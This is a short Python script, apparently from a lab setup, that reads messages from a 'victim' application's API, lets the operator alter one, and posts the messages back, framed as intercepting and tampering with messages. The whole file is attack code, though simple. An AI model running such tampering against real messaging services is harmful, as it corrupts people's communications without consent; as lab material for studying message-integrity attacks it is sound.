import requests

# URL of the victim application
victim_url = "http://victim:5000"

def intercept_and_modify_messages():
    # Get messages
    response = requests.get(f"{victim_url}/messages")
    if response.status_code == 200:
        messages = response.json().get("messages", [])
        print("Intercepted Messages:")
        for i, message in enumerate(messages):
            print(f"{i}: {message}")

        # Modify a message
        if messages:
            index = int(input("Enter the index of the message to modify: "))
            new_message = input("Enter the new message content: ")
            messages[index] = new_message

            # Send modified messages back
            for message in messages:
                response = requests.post(f"{victim_url}/send", json={"message": message})
                if response.status_code == 200:
                    print(f"Modified message sent: {message}")
                else:
                    print(f"Failed to send modified message: {message}")
    else:
        print("Failed to intercept messages")

if __name__ == "__main__":
    intercept_and_modify_messages()
